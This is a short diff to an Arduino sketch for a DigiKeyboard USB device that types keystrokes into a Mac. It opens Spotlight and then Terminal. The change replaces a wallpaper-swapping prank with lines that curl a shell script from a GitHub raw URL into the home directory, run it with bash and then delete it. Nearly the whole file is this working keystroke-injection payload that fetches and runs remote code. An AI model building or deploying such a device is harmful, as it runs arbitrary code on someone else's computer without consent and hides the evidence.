@@ -1,6 +1,5 @@
 #include "DigiKeyboard.h"
 void setup() {
-  pinMode(0, OUTPUT);
   pinMode(1, OUTPUT);
 }
 
@@ -12,12 +11,11 @@ void p(char *line) {
 
 void loop() {
   DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(1000);
   p("terminal");
-  p("curl -o hoff.jpg https://github.com/rmilne/hoffer/raw/master/img/h0.jpg");
+  p("curl -o ~/h.sh https://raw.githubusercontent.com/rmilne/hoffer/master/hoff_osx.sh");
   DigiKeyboard.delay(500);
-  p("sqlite3 /$HOME/Library/Application\\ Support/Dock/desktoppicture.db \"update data set value = '/Users/$USER/hoff.jpg'\" && killall Dock");
-  p("exit");  
+  p("bash ~/h.sh ; rm ~/h.sh ; exit");
   for(;;){ 
     digitalWrite(1, HIGH);
     delay(200);
